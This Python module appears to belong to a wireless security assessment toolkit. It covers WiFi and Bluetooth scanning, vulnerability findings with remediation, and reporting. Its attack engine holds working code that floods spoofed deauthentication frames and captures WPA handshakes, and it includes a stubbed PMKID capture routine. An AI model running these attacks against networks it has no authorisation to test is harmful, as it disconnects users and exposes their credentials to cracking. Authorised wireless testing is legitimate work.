"""
HydraRecon Advanced Wireless Security Analysis Module
Multi-protocol wireless security testing (WiFi, Bluetooth, ZigBee, LoRa)
"""

import asyncio
import hashlib
import os
import re
import struct
import subprocess
import threading
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
import logging

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

logger = logging.getLogger(__name__)


class WirelessProtocol(Enum):
    """Wireless protocols"""
    WIFI_2_4GHZ = "wifi_2.4ghz"
    WIFI_5GHZ = "wifi_5ghz"
    WIFI_6GHZ = "wifi_6ghz"
    BLUETOOTH_CLASSIC = "bluetooth_classic"
    BLUETOOTH_LE = "bluetooth_le"
    ZIGBEE = "zigbee"
    ZWAVE = "zwave"
    LORA = "lora"
    NFC = "nfc"
    RFID = "rfid"
    GPS = "gps"
    SDR = "sdr"


class WiFiSecurityType(Enum):
    """WiFi security types"""
    OPEN = "open"
    WEP = "wep"
    WPA = "wpa"
    WPA2_PSK = "wpa2_psk"
    WPA2_ENTERPRISE = "wpa2_enterprise"
    WPA3_SAE = "wpa3_sae"
    WPA3_ENTERPRISE = "wpa3_enterprise"
    OWE = "owe"
    UNKNOWN = "unknown"


class AttackType(Enum):
    """Wireless attack types"""
    DEAUTH = "deauthentication"
    EVIL_TWIN = "evil_twin"
    PMKID = "pmkid_capture"
    WPS_PIN = "wps_pin_attack"
    KRACK = "krack"
    DRAGONBLOOD = "dragonblood"
    KARMA = "karma"
    BEACON_FLOOD = "beacon_flood"
    HANDSHAKE_CAPTURE = "handshake_capture"
    REPLAY = "replay_attack"
    BLUEJACKING = "bluejacking"
    BLUESNARFING = "bluesnarfing"
    BTLEJACK = "btlejack"


class SeverityLevel(Enum):
    """Vulnerability severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class WirelessNetwork:
    """WiFi network information"""
    bssid: str
    ssid: str
    channel: int
    frequency: int
    signal_strength: int
    security_type: WiFiSecurityType
    cipher: Optional[str] = None
    auth: Optional[str] = None
    wps_enabled: bool = False
    hidden: bool = False
    vendor: Optional[str] = None
    clients: List[str] = field(default_factory=list)
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    beacon_count: int = 0
    data_packets: int = 0


@dataclass
class BluetoothDevice:
    """Bluetooth device information"""
    address: str
    name: Optional[str] = None
    device_class: Optional[int] = None
    device_type: str = "unknown"
    is_ble: bool = False
    rssi: int = 0
    manufacturer: Optional[str] = None
    services: List[str] = field(default_factory=list)
    characteristics: List[Dict[str, Any]] = field(default_factory=list)
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)


@dataclass
class WirelessVulnerability:
    """Wireless vulnerability finding"""
    vuln_id: str
    title: str
    description: str
    severity: SeverityLevel
    protocol: WirelessProtocol
    target: str
    attack_type: Optional[AttackType] = None
    remediation: str = ""
    proof_of_concept: Optional[str] = None
    cve_ids: List[str] = field(default_factory=list)
    discovered_at: datetime = field(default_factory=datetime.now)


@dataclass
class CapturedHandshake:
    """Captured WiFi handshake"""
    bssid: str
    ssid: str
    client_mac: str
    eapol_packets: List[bytes] = field(default_factory=list)
    anonce: Optional[bytes] = None
    snonce: Optional[bytes] = None
    mic: Optional[bytes] = None
    captured_at: datetime = field(default_factory=datetime.now)
    is_complete: bool = False


class WirelessInterface:
    """Wireless interface management"""
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.monitor_interface: Optional[str] = None
        self.original_mode: str = 'managed'
        self.current_channel: int = 1
        
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode on interface"""
        try:
            # Check if airmon-ng is available
            subprocess.run(['which', 'airmon-ng'], check=True, capture_output=True)
            
            # Enable monitor mode
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'start', self.interface],
                capture_output=True,
                text=True
            )
            
            # Parse output for monitor interface name
            output = result.stdout
            if 'mon' in output:
                self.monitor_interface = f"{self.interface}mon"
            else:
                # Try iw method
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
                subprocess.run(['sudo', 'iw', self.interface, 'set', 'monitor', 'none'], check=True)
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
                self.monitor_interface = self.interface
                
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to enable monitor mode: {e}")
            return False
            
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode"""
        try:
            if 'mon' in self.interface:
                subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], check=True)
            else:
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], check=True)
                subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'], check=True)
                subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], check=True)
                
            return True
            
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to disable monitor mode: {e}")
            return False
            
    def set_channel(self, channel: int) -> bool:
        """Set interface channel"""
        try:
            iface = self.monitor_interface or self.interface
            subprocess.run(['sudo', 'iw', iface, 'set', 'channel', str(channel)], check=True)
            self.current_channel = channel
            return True
        except subprocess.CalledProcessError:
            return False
            
    def get_supported_channels(self) -> List[int]:
        """Get list of supported channels"""
        try:
            result = subprocess.run(
                ['iw', 'phy', 'phy0', 'info'],
                capture_output=True,
                text=True
            )
            
            channels = []
            for line in result.stdout.split('\n'):
                if 'MHz' in line and '*' not in line:
                    match = re.search(r'\[(\d+)\]', line)
                    if match:
                        channels.append(int(match.group(1)))
                        
            return sorted(set(channels))
            
        except Exception:
            return list(range(1, 14)) + [36, 40, 44, 48, 52, 56, 60, 64]


class WiFiScanner:
    """WiFi network scanner"""
    
    def __init__(self, interface: WirelessInterface):
        self.interface = interface
        self.networks: Dict[str, WirelessNetwork] = {}
        self.clients: Dict[str, Dict[str, Any]] = {}
        self.scan_callbacks: List[Callable] = []
        self._scanning = False
        self._scan_thread: Optional[threading.Thread] = None
        
    def start_scan(self, channels: Optional[List[int]] = None, duration: int = 30):
        """Start WiFi scanning"""
        if self._scanning:
            return
            
        self._scanning = True
        channels = channels or list(range(1, 14))
        
        self._scan_thread = threading.Thread(
            target=self._scan_loop,
            args=(channels, duration)
        )
        self._scan_thread.start()
        
    def stop_scan(self):
        """Stop WiFi scanning"""
        self._scanning = False
        if self._scan_thread:
            self._scan_thread.join(timeout=5)
            
    def _scan_loop(self, channels: List[int], duration: int):
        """Main scan loop"""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available for WiFi scanning")
            return
            
        start_time = datetime.now()
        channel_idx = 0
        
        def packet_handler(pkt):
            if not self._scanning:
                return
                
            try:
                if pkt.haslayer(Dot11Beacon):
                    self._handle_beacon(pkt)
                elif pkt.haslayer(Dot11):
                    self._handle_data(pkt)
            except Exception as e:
                logger.debug(f"Packet handling error: {e}")
                
        iface = self.interface.monitor_interface or self.interface.interface
        
        while self._scanning:
            if (datetime.now() - start_time).seconds >= duration:
                break
                
            # Channel hopping
            self.interface.set_channel(channels[channel_idx])
            channel_idx = (channel_idx + 1) % len(channels)
            
            try:
                sniff(
                    iface=iface,
                    prn=packet_handler,
                    timeout=0.5,
                    store=0
                )
            except Exception as e:
                logger.error(f"Sniff error: {e}")
                
    def _handle_beacon(self, pkt):
        """Handle beacon frame"""
        try:
            bssid = pkt[Dot11].addr2
            
            # Get SSID
            ssid = ""
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 0:  # SSID
                        ssid = elt.info.decode('utf-8', errors='ignore')
                    elt = elt.payload.getlayer(Dot11Elt)
                    
            if not ssid:
                ssid = "<hidden>"
                
            # Get channel
            channel = self._get_channel(pkt)
            
            # Get security type
            security = self._determine_security(pkt)
            
            # Get signal strength
            signal = pkt[RadioTap].dBm_AntSignal if pkt.haslayer(RadioTap) else -100
            
            if bssid in self.networks:
                network = self.networks[bssid]
                network.last_seen = datetime.now()
                network.beacon_count += 1
                network.signal_strength = signal
            else:
                network = WirelessNetwork(
                    bssid=bssid,
                    ssid=ssid,
                    channel=channel,
                    frequency=2412 + (channel - 1) * 5,
                    signal_strength=signal,
                    security_type=security,
                    hidden=(ssid == "<hidden>")
                )
                self.networks[bssid] = network
                
                # Notify callbacks
                for callback in self.scan_callbacks:
                    callback('network_found', network)
                    
        except Exception as e:
            logger.debug(f"Beacon handling error: {e}")
            
    def _handle_data(self, pkt):
        """Handle data frame"""
        try:
            if pkt.type == 2:  # Data frame
                to_ds = pkt.FCfield & 0x1
                from_ds = pkt.FCfield & 0x2
                
                if to_ds and not from_ds:
                    # Client to AP
                    client = pkt.addr2
                    bssid = pkt.addr1
                elif from_ds and not to_ds:
                    # AP to client
                    client = pkt.addr1
                    bssid = pkt.addr2
                else:
                    return
                    
                if bssid in self.networks:
                    if client not in self.networks[bssid].clients:
                        self.networks[bssid].clients.append(client)
                    self.networks[bssid].data_packets += 1
                    
        except Exception as e:
            logger.debug(f"Data handling error: {e}")
            
    def _get_channel(self, pkt) -> int:
        """Extract channel from beacon"""
        try:
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 3:  # DS Parameter Set
                        return elt.info[0]
                    elt = elt.payload.getlayer(Dot11Elt)
        except Exception:
            pass
        return 0
        
    def _determine_security(self, pkt) -> WiFiSecurityType:
        """Determine security type from beacon"""
        try:
            cap = pkt.cap
            
            # Check RSN (WPA2/WPA3)
            if pkt.haslayer(Dot11Elt):
                elt = pkt[Dot11Elt]
                while elt:
                    if elt.ID == 48:  # RSN Information
                        info = bytes(elt.info)
                        if b'\x00\x0f\xac\x08' in info:  # SAE
                            return WiFiSecurityType.WPA3_SAE
                        return WiFiSecurityType.WPA2_PSK
                    elif elt.ID == 221:  # Vendor Specific (WPA)
                        if bytes(elt.info).startswith(b'\x00\x50\xf2\x01'):
                            return WiFiSecurityType.WPA
                    elt = elt.payload.getlayer(Dot11Elt)
                    
            if cap & 0x10:  # Privacy bit
                return WiFiSecurityType.WEP
                
            return WiFiSecurityType.OPEN
            
        except Exception:
            return WiFiSecurityType.UNKNOWN


class WiFiAttackEngine:
    """WiFi attack simulation engine"""
    
    def __init__(self, interface: WirelessInterface):
        self.interface = interface
        self.captured_handshakes: Dict[str, CapturedHandshake] = {}
        self.attack_callbacks: List[Callable] = []
        self._attacking = False
        
    async def deauth_attack(self, target_bssid: str, client_mac: str = 'ff:ff:ff:ff:ff:ff', count: int = 10):
        """Send deauthentication frames"""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available")
            return
            
        # Deauth from AP to client
        dot11 = Dot11(
            type=0,
            subtype=12,
            addr1=client_mac,
            addr2=target_bssid,
            addr3=target_bssid
        )
        
        from scapy.layers.dot11 import Dot11Deauth
        pkt1 = RadioTap() / dot11 / Dot11Deauth(reason=7)
        
        # Deauth from client to AP
        dot11_2 = Dot11(
            type=0,
            subtype=12,
            addr1=target_bssid,
            addr2=client_mac,
            addr3=target_bssid
        )
        pkt2 = RadioTap() / dot11_2 / Dot11Deauth(reason=7)
        
        iface = self.interface.monitor_interface or self.interface.interface
        
        for i in range(count):
            sendp(pkt1, iface=iface, verbose=0)
            sendp(pkt2, iface=iface, verbose=0)
            await asyncio.sleep(0.1)
            
    async def capture_handshake(self, target_bssid: str, timeout: int = 60) -> Optional[CapturedHandshake]:
        """Capture WPA/WPA2 handshake"""
        if not SCAPY_AVAILABLE:
            return None
            
        handshake = CapturedHandshake(
            bssid=target_bssid,
            ssid="",
            client_mac=""
        )
        
        eapol_count = 0
        start_time = datetime.now()
        
        def eapol_handler(pkt):
            nonlocal eapol_count
            
            if not pkt.haslayer(EAPOL):
                return
                
            try:
                # Check if related to target
                if pkt.haslayer(Dot11):
                    if target_bssid not in [pkt[Dot11].addr1, pkt[Dot11].addr2, pkt[Dot11].addr3]:
                        return
                        
                # Extract EAPOL data
                eapol_data = bytes(pkt[EAPOL])
                handshake.eapol_packets.append(eapol_data)
                
                # Parse key information
                if len(eapol_data) > 17:
                    key_info = struct.unpack('>H', eapol_data[5:7])[0]
                    key_type = (key_info >> 3) & 0x1
                    
                    if key_type == 1:  # Pairwise key
                        eapol_count += 1
                        
                        # Extract nonces
                        if eapol_count == 1:
                            handshake.anonce = eapol_data[17:49]
                        elif eapol_count == 2:
                            handshake.snonce = eapol_data[17:49]
                            handshake.mic = eapol_data[81:97]
                            
                        if eapol_count >= 2:
                            handshake.is_complete = True
                            
            except Exception as e:
                logger.debug(f"EAPOL parsing error: {e}")
                
        iface = self.interface.monitor_interface or self.interface.interface
        
        # Start capture
        while (datetime.now() - start_time).seconds < timeout:
            try:
                sniff(
                    iface=iface,
                    prn=eapol_handler,
                    timeout=5,
                    store=0,
                    lfilter=lambda x: x.haslayer(EAPOL)
                )
                
                if handshake.is_complete:
                    break
                    
            except Exception as e:
                logger.error(f"Capture error: {e}")
                break
                
        if handshake.is_complete:
            self.captured_handshakes[target_bssid] = handshake
            return handshake
            
        return None
        
    async def pmkid_attack(self, target_bssid: str, timeout: int = 30) -> Optional[bytes]:
        """Attempt PMKID capture (clientless attack)"""
        if not SCAPY_AVAILABLE:
            return None
            
        pmkid = None
        
        def pmkid_handler(pkt):
            nonlocal pmkid
            
            if not pkt.haslayer(EAPOL):
                return
                
            try:
                if pkt.haslayer(Dot11):
                    if pkt[Dot11].addr2 == target_bssid:
                        eapol_data = bytes(pkt[EAPOL])
                        
                        # Check for PMKID in RSN PMKID list (tag 0xdd)
                        if len(eapol_data) > 99:
                            rsn_data = eapol_data[99:]
                            if rsn_data[:4] == b'\x00\x0f\xac\x04':
                                pmkid = rsn_data[4:20]
                                
            except Exception:
                pass
                
        iface = self.interface.monitor_interface or self.interface.interface
        
        # Send authentication request
        # ... (implementation would send proper 802.11 frames)
        
        try:
            sniff(
                iface=iface,
                prn=pmkid_handler,
                timeout=timeout,
                store=0
            )
        except Exception:
            pass
            
        return pmkid


class BluetoothScanner:
    """Bluetooth device scanner"""
    
    def __init__(self):
        self.devices: Dict[str, BluetoothDevice] = {}
        self.scan_callbacks: List[Callable] = []
        self._scanning = False
        
    def scan_classic(self, duration: int = 10) -> List[BluetoothDevice]:
        """Scan for classic Bluetooth devices"""
        devices = []
        
        try:
            # Use hcitool for discovery
            result = subprocess.run(
                ['sudo', 'hcitool', 'scan', '--length', str(duration)],
                capture_output=True,
                text=True,
                timeout=duration + 5
            )
            
            for line in result.stdout.strip().split('\n')[1:]:
                if '\t' in line:
                    parts = line.strip().split('\t')
                    if len(parts) >= 2:
                        address = parts[0]
                        name = parts[1] if len(parts) > 1 else None
                        
                        device = BluetoothDevice(
                            address=address,
                            name=name,
                            is_ble=False
                        )
                        
                        devices.append(device)
                        self.devices[address] = device
                        
        except subprocess.TimeoutExpired:
            pass
        except Exception as e:
            logger.error(f"Bluetooth scan error: {e}")
            
        return devices
        
    def scan_ble(self, duration: int = 10) -> List[BluetoothDevice]:
        """Scan for Bluetooth Low Energy devices"""
        devices = []
        
        try:
            # Use hcitool lescan
            process = subprocess.Popen(
                ['sudo', 'hcitool', 'lescan', '--duplicates'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            import time
            time.sleep(duration)
            process.terminate()
            
            output, _ = process.communicate()
            
            seen = set()
            for line in output.strip().split('\n'):
                parts = line.strip().split(' ', 1)
                if len(parts) >= 1:
                    address = parts[0]
                    
                    if address not in seen and ':' in address:
                        seen.add(address)
                        name = parts[1] if len(parts) > 1 else None
                        
                        device = BluetoothDevice(
                            address=address,
                            name=name,
                            is_ble=True
                        )
                        
                        devices.append(device)
                        self.devices[address] = device
                        
        except Exception as e:
            logger.error(f"BLE scan error: {e}")
            
        return devices
        
    def get_device_info(self, address: str) -> Dict[str, Any]:
        """Get detailed device information"""
        info = {}
        
        try:
            # Get device class
            result = subprocess.run(
                ['sudo', 'hcitool', 'info', address],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            for line in result.stdout.split('\n'):
                if 'Device Class' in line:
                    info['device_class'] = line.split(':')[1].strip()
                elif 'Manufacturer' in line:
                    info['manufacturer'] = line.split(':')[1].strip()
                    
        except Exception:
            pass
            
        return info


class WirelessSecurityAnalyzer:
    """Wireless security vulnerability analyzer"""
    
    def __init__(self):
        self.vulnerabilities: List[WirelessVulnerability] = []
        
    def analyze_network(self, network: WirelessNetwork) -> List[WirelessVulnerability]:
        """Analyze WiFi network for vulnerabilities"""
        vulns = []
        
        # Check security type
        if network.security_type == WiFiSecurityType.OPEN:
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-OPEN-{network.bssid.replace(':', '')}",
                title="Open WiFi Network",
                description=f"Network '{network.ssid}' has no encryption",
                severity=SeverityLevel.HIGH,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                remediation="Enable WPA3 or at minimum WPA2 encryption"
            ))
        elif network.security_type == WiFiSecurityType.WEP:
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-WEP-{network.bssid.replace(':', '')}",
                title="WEP Encryption (Broken)",
                description=f"Network '{network.ssid}' uses broken WEP encryption",
                severity=SeverityLevel.CRITICAL,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                attack_type=AttackType.HANDSHAKE_CAPTURE,
                remediation="Upgrade to WPA3 or WPA2",
                cve_ids=["CVE-2001-0361"]
            ))
        elif network.security_type == WiFiSecurityType.WPA:
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-WPA1-{network.bssid.replace(':', '')}",
                title="WPA1 Encryption (Weak)",
                description=f"Network '{network.ssid}' uses deprecated WPA encryption",
                severity=SeverityLevel.HIGH,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                attack_type=AttackType.HANDSHAKE_CAPTURE,
                remediation="Upgrade to WPA3 or WPA2"
            ))
        elif network.security_type == WiFiSecurityType.WPA2_PSK:
            # Check for KRACK vulnerability indicators
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-KRACK-{network.bssid.replace(':', '')}",
                title="Potential KRACK Vulnerability",
                description=f"Network '{network.ssid}' may be vulnerable to KRACK attack",
                severity=SeverityLevel.MEDIUM,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                attack_type=AttackType.KRACK,
                remediation="Update router firmware and all client devices",
                cve_ids=["CVE-2017-13077", "CVE-2017-13078"]
            ))
            
        # Check WPS
        if network.wps_enabled:
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-WPS-{network.bssid.replace(':', '')}",
                title="WPS Enabled",
                description=f"Network '{network.ssid}' has WPS enabled",
                severity=SeverityLevel.HIGH,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                attack_type=AttackType.WPS_PIN,
                remediation="Disable WPS",
                cve_ids=["CVE-2011-5053"]
            ))
            
        # Check hidden SSID
        if network.hidden:
            vulns.append(WirelessVulnerability(
                vuln_id=f"WIFI-HIDDEN-{network.bssid.replace(':', '')}",
                title="Hidden SSID (False Security)",
                description=f"Network uses hidden SSID which provides no real security",
                severity=SeverityLevel.LOW,
                protocol=WirelessProtocol.WIFI_2_4GHZ,
                target=network.bssid,
                remediation="Hidden SSIDs don't improve security, consider enabling if needed"
            ))
            
        self.vulnerabilities.extend(vulns)
        return vulns
        
    def analyze_bluetooth(self, device: BluetoothDevice) -> List[WirelessVulnerability]:
        """Analyze Bluetooth device for vulnerabilities"""
        vulns = []
        
        if device.is_ble:
            # Check for common BLE vulnerabilities
            vulns.append(WirelessVulnerability(
                vuln_id=f"BLE-PAIRING-{device.address.replace(':', '')}",
                title="BLE Device - Pairing Analysis Required",
                description=f"BLE device {device.name or device.address} may use weak pairing",
                severity=SeverityLevel.INFO,
                protocol=WirelessProtocol.BLUETOOTH_LE,
                target=device.address,
                remediation="Verify device uses LE Secure Connections"
            ))
        else:
            # Classic Bluetooth
            vulns.append(WirelessVulnerability(
                vuln_id=f"BT-CLASSIC-{device.address.replace(':', '')}",
                title="Classic Bluetooth Device",
                description=f"Device {device.name or device.address} uses classic Bluetooth",
                severity=SeverityLevel.INFO,
                protocol=WirelessProtocol.BLUETOOTH_CLASSIC,
                target=device.address,
                remediation="Evaluate if BLE would be more appropriate"
            ))
            
        self.vulnerabilities.extend(vulns)
        return vulns


class AdvancedWirelessSecurity:
    """Main wireless security integration class"""
    
    def __init__(self, interface: str = 'wlan0'):
        self.wifi_interface = WirelessInterface(interface)
        self.wifi_scanner = WiFiScanner(self.wifi_interface)
        self.wifi_attacks = WiFiAttackEngine(self.wifi_interface)
        self.bluetooth_scanner = BluetoothScanner()
        self.analyzer = WirelessSecurityAnalyzer()
        
    def enable_monitor_mode(self) -> bool:
        """Enable monitor mode"""
        return self.wifi_interface.enable_monitor_mode()
        
    def disable_monitor_mode(self) -> bool:
        """Disable monitor mode"""
        return self.wifi_interface.disable_monitor_mode()
        
    def scan_wifi(self, duration: int = 30) -> Dict[str, WirelessNetwork]:
        """Scan for WiFi networks"""
        self.wifi_scanner.start_scan(duration=duration)
        
        import time
        time.sleep(duration)
        
        self.wifi_scanner.stop_scan()
        return self.wifi_scanner.networks
        
    def scan_bluetooth(self, duration: int = 10, ble: bool = True) -> Dict[str, BluetoothDevice]:
        """Scan for Bluetooth devices"""
        self.bluetooth_scanner.scan_classic(duration)
        
        if ble:
            self.bluetooth_scanner.scan_ble(duration)
            
        return self.bluetooth_scanner.devices
        
    async def full_assessment(self) -> Dict[str, Any]:
        """Perform full wireless security assessment"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'wifi_networks': [],
            'bluetooth_devices': [],
            'vulnerabilities': [],
            'summary': {
                'total_networks': 0,
                'total_bluetooth': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'info': 0
            }
        }
        
        # Enable monitor mode
        self.enable_monitor_mode()
        
        # Scan WiFi
        networks = self.scan_wifi(duration=30)
        results['summary']['total_networks'] = len(networks)
        
        for network in networks.values():
            results['wifi_networks'].append({
                'bssid': network.bssid,
                'ssid': network.ssid,
                'channel': network.channel,
                'security': network.security_type.value,
                'signal': network.signal_strength,
                'clients': len(network.clients)
            })
            
            # Analyze network
            vulns = self.analyzer.analyze_network(network)
            for vuln in vulns:
                results['vulnerabilities'].append({
                    'id': vuln.vuln_id,
                    'title': vuln.title,
                    'severity': vuln.severity.value,
                    'target': vuln.target,
                    'remediation': vuln.remediation
                })
                results['summary'][vuln.severity.value] += 1
                
        # Disable monitor mode before Bluetooth scan
        self.disable_monitor_mode()
        
        # Scan Bluetooth
        devices = self.scan_bluetooth(duration=10)
        results['summary']['total_bluetooth'] = len(devices)
        
        for device in devices.values():
            results['bluetooth_devices'].append({
                'address': device.address,
                'name': device.name,
                'is_ble': device.is_ble,
                'rssi': device.rssi
            })
            
            vulns = self.analyzer.analyze_bluetooth(device)
            for vuln in vulns:
                results['vulnerabilities'].append({
                    'id': vuln.vuln_id,
                    'title': vuln.title,
                    'severity': vuln.severity.value,
                    'target': vuln.target,
                    'remediation': vuln.remediation
                })
                results['summary'][vuln.severity.value] += 1
                
        return results
        
    def generate_report(self, results: Dict[str, Any]) -> str:
        """Generate wireless security report"""
        report = []
        
        report.append("=" * 60)
        report.append("WIRELESS SECURITY ASSESSMENT REPORT")
        report.append("=" * 60)
        
        report.append(f"\nScan Time: {results['timestamp']}")
        
        report.append(f"\n{'=' * 40}")
        report.append("SUMMARY")
        report.append("=" * 40)
        
        summary = results['summary']
        report.append(f"WiFi Networks: {summary['total_networks']}")
        report.append(f"Bluetooth Devices: {summary['total_bluetooth']}")
        report.append(f"\nVulnerabilities:")
        report.append(f"  Critical: {summary['critical']}")
        report.append(f"  High: {summary['high']}")
        report.append(f"  Medium: {summary['medium']}")
        report.append(f"  Low: {summary['low']}")
        
        report.append(f"\n{'=' * 40}")
        report.append("WIFI NETWORKS")
        report.append("=" * 40)
        
        for network in results['wifi_networks']:
            report.append(f"\n[{network['security'].upper()}] {network['ssid']}")
            report.append(f"  BSSID: {network['bssid']}")
            report.append(f"  Channel: {network['channel']}")
            report.append(f"  Signal: {network['signal']} dBm")
            report.append(f"  Clients: {network['clients']}")
            
        report.append(f"\n{'=' * 40}")
        report.append("BLUETOOTH DEVICES")
        report.append("=" * 40)
        
        for device in results['bluetooth_devices']:
            device_type = "BLE" if device['is_ble'] else "Classic"
            report.append(f"\n[{device_type}] {device['name'] or 'Unknown'}")
            report.append(f"  Address: {device['address']}")
            
        return "\n".join(report)
